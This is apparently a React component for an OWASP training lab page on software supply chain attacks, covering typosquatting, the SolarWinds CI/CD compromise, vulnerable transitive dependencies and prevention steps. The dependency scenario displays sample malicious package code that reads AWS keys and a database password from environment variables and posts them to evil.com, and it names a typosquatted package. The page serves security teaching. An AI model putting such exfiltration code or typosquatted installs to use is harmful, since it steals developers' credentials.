import { useState } from 'react';
import { ArrowLeft, Package, AlertTriangle, CheckCircle, RefreshCw } from 'lucide-react';
import { Link } from 'react-router';
import { motion, AnimatePresence, Variants } from 'motion/react';
import { useTheme } from '../../../context/ThemeContext';
import { translations } from '../../../translations';

export function SoftwareSupplyChain() {
  const { language } = useTheme();
  const t = translations[language];
  const [scenario, setScenario] = useState<'dependency' | 'ci-cd' | 'transitive'>('dependency');
  const [isCompleted, setIsCompleted] = useState(false);
  const [showVulnerability, setShowVulnerability] = useState(false);

  const handleReset = () => {
    setIsCompleted(false);
    setShowVulnerability(false);
    setScenario('dependency');
  };

  const triggerExploit = () => {
    setShowVulnerability(true);
    setIsCompleted(true);
  };

  const sectionVariants: Variants = {
    hidden: { opacity: 0, y: 20 },
    visible: (i: number) => ({
      opacity: 1,
      y: 0,
      transition: { delay: i * 0.08, duration: 0.3, ease: 'easeOut' },
    }),
  };

  const scenarioItems = [
    { id: 'dependency' as const, label: language === 'en' ? 'Dependency Hijacking' : 'Захват зависимости' },
    { id: 'ci-cd' as const, label: language === 'en' ? 'CI/CD Compromise' : 'Компрометация CI/CD' },
    { id: 'transitive' as const, label: language === 'en' ? 'Transitive Dependencies' : 'Транзитивные зависимости' },
  ];

  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      transition={{ duration: 0.3 }}
      className="max-w-5xl mx-auto space-y-6"
    >
      <motion.div initial={{ x: -20, opacity: 0 }} animate={{ x: 0, opacity: 1 }} transition={{ duration: 0.25 }}>
        <Link to="/owasp-lab/threat-map" className="inline-flex items-center gap-2 text-[var(--accent-primary)] hover:underline">
          <ArrowLeft className="w-4 h-4" />
          {t.backToThreatMap}
        </Link>
      </motion.div>

      <motion.div
        custom={0}
        variants={sectionVariants}
        initial="hidden"
        animate="visible"
        className="bg-[var(--bg-primary)] border border-[var(--border-primary)] rounded-xl p-6 shadow-sm"
      >
        <div className="flex items-center gap-3 mb-4">
          <motion.div
            initial={{ rotate: -180, scale: 0 }}
            animate={{ rotate: 0, scale: 1 }}
            transition={{ type: 'spring', stiffness: 200, damping: 15, delay: 0.1 }}
            className="p-3 bg-indigo-100 rounded-lg"
          >
            <Package className="w-6 h-6 text-indigo-600" />
          </motion.div>
          <div>
            <h1 className="text-[var(--text-primary)]">
              {language === 'en' ? 'Software Supply Chain Failures' : 'Сбои цепочки поставок ПО'}
            </h1>
            <p className="text-sm text-[var(--text-secondary)]">
              {language === 'en' ? 'OWASP #6 - Third-Party Dependency Vulnerabilities' : 'OWASP #6 - Уязвимости сторонних зависимостей'}
            </p>
          </div>
        </div>

        <p className="text-[var(--text-secondary)] mb-4">
          {language === 'en'
            ? 'Security breaches exploiting vulnerabilities in third-party libraries, open-source code, or CI/CD pipelines to insert malicious code during development or distribution.'
            : 'Нарушения безопасности, эксплуатирующие уязвимости в сторонних библиотеках, открытом коде или конвейерах CI/CD для внедрения вредоносного кода при разработке или распространении.'}
        </p>

        <motion.div
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 0.3 }}
          className="bg-[var(--hover-bg)] border border-[var(--border-primary)] rounded-lg p-4"
        >
          <h3 className="text-[var(--text-primary)] mb-3">
            {language === 'en' ? 'Notable Incidents:' : 'Известные инциденты:'}
          </h3>
          <div className="space-y-2 text-sm text-[var(--text-secondary)]">
            <p>• <strong className="text-red-600">Log4j (2021):</strong>{' '}
              {language === 'en'
                ? 'Critical vulnerability in widely-used logging library affecting millions of systems'
                : 'Критическая уязвимость в широко используемой библиотеке логирования, затронувшая миллионы систем'}
            </p>
            <p>• <strong className="text-red-600">SolarWinds (2020):</strong>{' '}
              {language === 'en'
                ? 'Attackers compromised software update mechanism, affecting 18,000+ organizations'
                : 'Атакующие скомпрометировали механизм обновления ПО, затронув более 18 000 организаций'}
            </p>
            <p>• <strong className="text-red-600">event-stream (npm):</strong>{' '}
              {language === 'en'
                ? 'Malicious code injected into popular JavaScript package'
                : 'Вредоносный код внедрён в популярный JavaScript-пакет'}
            </p>
          </div>
        </motion.div>
      </motion.div>

      <motion.div
        custom={1}
        variants={sectionVariants}
        initial="hidden"
        animate="visible"
        className="bg-[var(--bg-primary)] border border-[var(--border-primary)] rounded-xl p-6 shadow-sm"
      >
        <div className="flex items-center justify-between mb-4">
          <h2 className="text-[var(--text-primary)]">
            {language === 'en' ? 'Attack Vector Demonstrations' : 'Демонстрации векторов атак'}
          </h2>
          <motion.button
            whileHover={{ scale: 1.05 }}
            whileTap={{ scale: 0.95 }}
            onClick={handleReset}
            className="inline-flex items-center gap-2 px-3 py-2 border border-[var(--border-primary)] text-[var(--text-secondary)] rounded-lg hover:bg-[var(--hover-bg)] transition-all text-sm"
          >
            <RefreshCw className="w-4 h-4" />
            {t.restart}
          </motion.button>
        </div>

        <div className="grid md:grid-cols-3 gap-4 mb-6">
          {scenarioItems.map((item, index) => (
            <motion.button
              key={item.id}
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ delay: 0.1 + index * 0.07 }}
              whileHover={{ scale: 1.05, y: -5 }}
              whileTap={{ scale: 0.95 }}
              onClick={() => { setScenario(item.id); setShowVulnerability(false); }}
              className={`p-4 border-2 rounded-lg transition-all ${
                scenario === item.id
                  ? 'border-indigo-500 bg-indigo-50'
                  : 'border-[var(--border-primary)] hover:border-[var(--accent-primary)]'
              }`}
            >
              <Package className="w-6 h-6 text-indigo-600 mx-auto mb-2" />
              <div className="text-sm text-[var(--text-primary)]">{item.label}</div>
            </motion.button>
          ))}
        </div>

        <AnimatePresence mode="wait">
          {scenario === 'dependency' && (
            <motion.div
              key="dependency"
              initial={{ opacity: 0, x: -20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: 20 }}
              transition={{ duration: 0.3 }}
              className="space-y-4"
            >
              <div className="bg-[var(--hover-bg)] border border-[var(--border-primary)] rounded-lg p-6">
                <h3 className="text-[var(--text-primary)] mb-3">
                  {language === 'en' ? 'Dependency Hijacking Attack' : 'Атака захвата зависимости'}
                </h3>
                <p className="text-sm text-[var(--text-secondary)] mb-4">
                  {language === 'en'
                    ? 'Attacker publishes malicious package to npm registry with typosquatting name similar to popular library.'
                    : 'Атакующий публикует вредоносный пакет в реестр npm с похожим на популярную библиотеку названием (тайпсквоттинг).'}
                </p>

                <div className="space-y-3">
                  <div className="p-4 bg-white rounded-lg border border-[var(--border-primary)]">
                    <div className="flex items-center justify-between mb-2">
                      <span className="text-sm text-gray-600">
                        {language === 'en' ? 'Legitimate Package:' : 'Легитимный пакет:'}
                      </span>
                      <CheckCircle className="w-5 h-5 text-green-600" />
                    </div>
                    <code className="text-sm text-green-700">npm install react-router-dom</code>
                  </div>

                  <div className="p-4 bg-red-50 rounded-lg border border-red-300">
                    <div className="flex items-center justify-between mb-2">
                      <span className="text-sm text-red-700">
                        {language === 'en' ? 'Malicious Package:' : 'Вредоносный пакет:'}
                      </span>
                      <AlertTriangle className="w-5 h-5 text-red-600" />
                    </div>
                    <code className="text-sm text-red-700">npm install react-r0uter-dom</code>
                    <p className="text-xs text-red-600 mt-2">
                      {language === 'en' ? 'Note: "o" replaced with "0" (zero)' : 'Примечание: "o" заменена на "0" (ноль)'}
                    </p>
                  </div>
                </div>

                <motion.button
                  whileHover={{ scale: 1.02 }}
                  whileTap={{ scale: 0.98 }}
                  onClick={triggerExploit}
                  className="mt-4 px-6 py-3 bg-[var(--accent-primary)] text-[var(--accent-text)] rounded-lg hover:opacity-90 transition-opacity"
                >
                  {language === 'en' ? 'Simulate Package Installation' : 'Симулировать установку пакета'}
                </motion.button>

                <AnimatePresence>
                  {showVulnerability && (
                    <motion.div
                      initial={{ opacity: 0, height: 0 }}
                      animate={{ opacity: 1, height: 'auto' }}
                      exit={{ opacity: 0, height: 0 }}
                      className="mt-4 p-4 bg-red-50 border-2 border-red-500 rounded-lg"
                    >
                      <h4 className="text-red-800 mb-2">
                        🚨 {language === 'en' ? 'Malicious Code Executed!' : 'Вредоносный код выполнен!'}
                      </h4>
                      <pre className="text-xs bg-white p-3 rounded overflow-x-auto text-red-700">
{`// ${language === 'en' ? 'Malicious package code' : 'Код вредоносного пакета'}
const https = require('https');

// ${language === 'en' ? 'Steal environment variables' : 'Кража переменных окружения'}
const secrets = {
  AWS_KEY: process.env.AWS_ACCESS_KEY_ID,
  DB_PASSWORD: process.env.DATABASE_PASSWORD
};

// ${language === 'en' ? 'Exfiltrate to attacker server' : 'Отправка на сервер атакующего'}
https.post('https://evil.com/steal', secrets);`}
                      </pre>
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>
            </motion.div>
          )}

          {scenario === 'ci-cd' && (
            <motion.div
              key="ci-cd"
              initial={{ opacity: 0, x: -20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: 20 }}
              transition={{ duration: 0.3 }}
              className="bg-[var(--hover-bg)] border border-[var(--border-primary)] rounded-lg p-6"
            >
              <h3 className="text-[var(--text-primary)] mb-3">
                {language === 'en' ? 'CI/CD Pipeline Compromise' : 'Компрометация конвейера CI/CD'}
              </h3>
              <p className="text-sm text-[var(--text-secondary)] mb-4">
                {language === 'en'
                  ? 'Attackers gain access to CI/CD systems to inject malicious code into build artifacts.'
                  : 'Атакующие получают доступ к системам CI/CD для внедрения вредоносного кода в артефакты сборки.'}
              </p>

              <div className="bg-white p-4 rounded-lg border border-[var(--border-primary)] mb-4">
                <h4 className="text-sm text-[var(--text-primary)] mb-2">
                  {language === 'en' ? 'SolarWinds Attack Flow:' : 'Схема атаки SolarWinds:'}
                </h4>
                <ol className="text-xs text-[var(--text-secondary)] space-y-2 list-decimal list-inside">
                  {(language === 'en' ? [
                    'Attacker compromises build server credentials',
                    'Injects malicious code into Orion software build',
                    'Malware signed with legitimate certificate',
                    '18,000+ organizations install backdoored updates',
                    'Attackers gain persistent access to networks',
                  ] : [
                    'Атакующий компрометирует учётные данные сервера сборки',
                    'Внедряет вредоносный код в сборку ПО Orion',
                    'Вредоносная программа подписана легитимным сертификатом',
                    'Более 18 000 организаций устанавливают заражённые обновления',
                    'Атакующие получают постоянный доступ к сетям',
                  ]).map((step, i) => (
                    <li key={i}>{step}</li>
                  ))}
                </ol>
              </div>

              <motion.button
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
                onClick={triggerExploit}
                className="px-6 py-3 bg-[var(--accent-primary)] text-[var(--accent-text)] rounded-lg hover:opacity-90 transition-opacity"
              >
                {language === 'en' ? 'View Attack Diagram' : 'Показать схему атаки'}
              </motion.button>

              <AnimatePresence>
                {showVulnerability && (
                  <motion.div
                    initial={{ opacity: 0, scale: 0.9 }}
                    animate={{ opacity: 1, scale: 1 }}
                    exit={{ opacity: 0 }}
                    className="mt-4 p-4 bg-orange-50 border border-orange-300 rounded-lg"
                  >
                    <p className="text-sm text-orange-700">
                      <strong>{language === 'en' ? 'Impact:' : 'Воздействие:'}</strong>{' '}
                      {language === 'en'
                        ? 'Supply chain attacks can affect thousands of downstream customers. Organizations must secure every step of their build and deployment pipeline.'
                        : 'Атаки на цепочку поставок могут затронуть тысячи конечных потребителей. Организации должны защищать каждый шаг конвейера сборки и развёртывания.'}
                    </p>
                  </motion.div>
                )}
              </AnimatePresence>
            </motion.div>
          )}

          {scenario === 'transitive' && (
            <motion.div
              key="transitive"
              initial={{ opacity: 0, x: -20 }}
              animate={{ opacity: 1, x: 0 }}
              exit={{ opacity: 0, x: 20 }}
              transition={{ duration: 0.3 }}
              className="bg-[var(--hover-bg)] border border-[var(--border-primary)] rounded-lg p-6"
            >
              <h3 className="text-[var(--text-primary)] mb-3">
                {language === 'en' ? 'Transitive Dependency Vulnerabilities' : 'Уязвимости транзитивных зависимостей'}
              </h3>
              <p className="text-sm text-[var(--text-secondary)] mb-4">
                {language === 'en'
                  ? 'Vulnerabilities in indirect dependencies that your direct dependencies rely on.'
                  : 'Уязвимости в косвенных зависимостях, от которых зависят ваши прямые зависимости.'}
              </p>

              <div className="bg-white p-4 rounded-lg border border-[var(--border-primary)]">
                <code className="text-xs whitespace-pre-wrap text-gray-800">
{`Your Project
├── express@4.18.0
│   ├── body-parser@1.19.0
│   │   └── qs@6.9.1  ⚠️ VULNERABLE (CVE-2022-24999)
│   └── cookie@0.5.0
│       └── safe-buffer@5.1.1  ⚠️ VULNERABLE
└── lodash@4.17.20  ⚠️ VULNERABLE (Prototype Pollution)`}
                </code>
              </div>

              <motion.button
                whileHover={{ scale: 1.02 }}
                whileTap={{ scale: 0.98 }}
                onClick={triggerExploit}
                className="mt-4 px-6 py-3 bg-[var(--accent-primary)] text-[var(--accent-text)] rounded-lg hover:opacity-90 transition-opacity"
              >
                {language === 'en' ? 'Run Dependency Audit' : 'Запустить аудит зависимостей'}
              </motion.button>

              <AnimatePresence>
                {showVulnerability && (
                  <motion.div
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    exit={{ opacity: 0 }}
                    className="mt-4 space-y-2"
                  >
                    {['qs', 'safe-buffer', 'lodash'].map((pkg, i) => (
                      <motion.div
                        key={pkg}
                        initial={{ opacity: 0, x: -20 }}
                        animate={{ opacity: 1, x: 0 }}
                        transition={{ delay: i * 0.1 }}
                        className="p-3 bg-yellow-50 border border-yellow-300 rounded"
                      >
                        <div className="flex items-center gap-2">
                          <AlertTriangle className="w-4 h-4 text-yellow-600" />
                          <span className="text-sm text-yellow-800">
                            {language === 'en' ? 'Vulnerability found in' : 'Уязвимость найдена в'}{' '}
                            <code className="font-mono">{pkg}</code>
                          </span>
                        </div>
                      </motion.div>
                    ))}
                  </motion.div>
                )}
              </AnimatePresence>
            </motion.div>
          )}
        </AnimatePresence>
      </motion.div>

      <AnimatePresence>
        {isCompleted && (
          <motion.div
            initial={{ opacity: 0, scale: 0.9 }}
            animate={{ opacity: 1, scale: 1 }}
            exit={{ opacity: 0 }}
            className="bg-green-50 border border-green-300 rounded-xl p-6 text-center"
          >
            <h3 className="text-green-800 mb-4">{t.levelComplete}</h3>
            <p className="text-green-700 mb-4">
              {language === 'en'
                ? "You've explored software supply chain vulnerabilities. Protecting your dependency chain is critical for maintaining application security."
                : 'Вы изучили уязвимости цепочки поставок программного обеспечения. Защита цепочки зависимостей критически важна для поддержания безопасности приложений.'}
            </p>
            <motion.button
              whileHover={{ scale: 1.05 }}
              whileTap={{ scale: 0.95 }}
              onClick={handleReset}
              className="inline-flex items-center gap-2 px-6 py-3 bg-[var(--accent-primary)] text-[var(--accent-text)] rounded-lg hover:opacity-90 transition-opacity"
            >
              <RefreshCw className="w-4 h-4" />
              {t.restartLevel}
            </motion.button>
          </motion.div>
        )}
      </AnimatePresence>

      <motion.div
        custom={2}
        variants={sectionVariants}
        initial="hidden"
        animate="visible"
        className="bg-[var(--bg-primary)] border border-[var(--border-primary)] rounded-xl p-6 shadow-sm"
      >
        <h3 className="text-[var(--text-primary)] mb-4">{t.prevention}</h3>
        <div className="space-y-3">
          {[
            {
              title: language === 'en' ? 'Software Bill of Materials (SBOM)' : 'Реестр программного обеспечения (SBOM)',
              desc: language === 'en' ? 'Maintain complete inventory of all components including transitive dependencies' : 'Ведите полный реестр всех компонентов, включая транзитивные зависимости',
            },
            {
              title: language === 'en' ? 'Secure CI/CD Pipelines' : 'Безопасные конвейеры CI/CD',
              desc: language === 'en' ? 'Implement MFA, access control, and signed build artifacts' : 'Реализуйте MFA, контроль доступа и подписанные артефакты сборки',
            },
            {
              title: language === 'en' ? 'Dependency Verification' : 'Проверка зависимостей',
              desc: language === 'en' ? 'Verify packages using checksums and trusted sources only' : 'Проверяйте пакеты с помощью контрольных сумм и только из доверенных источников',
            },
            {
              title: language === 'en' ? 'Automated Scanning' : 'Автоматизированное сканирование',
              desc: language === 'en' ? 'Use tools like Snyk, Dependabot, or npm audit in CI/CD' : 'Используйте инструменты Snyk, Dependabot или npm audit в CI/CD',
            },
            {
              title: language === 'en' ? 'Pin Dependencies' : 'Фиксируйте версии зависимостей',
              desc: language === 'en' ? 'Use lock files to pin specific versions and avoid unexpected updates' : 'Используйте lock-файлы для фиксации конкретных версий и предотвращения неожиданных обновлений',
            },
            {
              title: language === 'en' ? 'Minimize Dependencies' : 'Минимизируйте зависимости',
              desc: language === 'en' ? 'Reduce attack surface by only including necessary packages' : 'Уменьшайте поверхность атаки, включая только необходимые пакеты',
            },
          ].map((item, index) => (
            <motion.div
              key={index}
              whileHover={{ x: 5 }}
              className="p-4 bg-green-50 border border-green-200 rounded-lg"
            >
              <h4 className="text-green-800 mb-1">✓ {item.title}</h4>
              <p className="text-sm text-green-700">{item.desc}</p>
            </motion.div>
          ))}
        </div>
      </motion.div>
    </motion.div>
  );
}
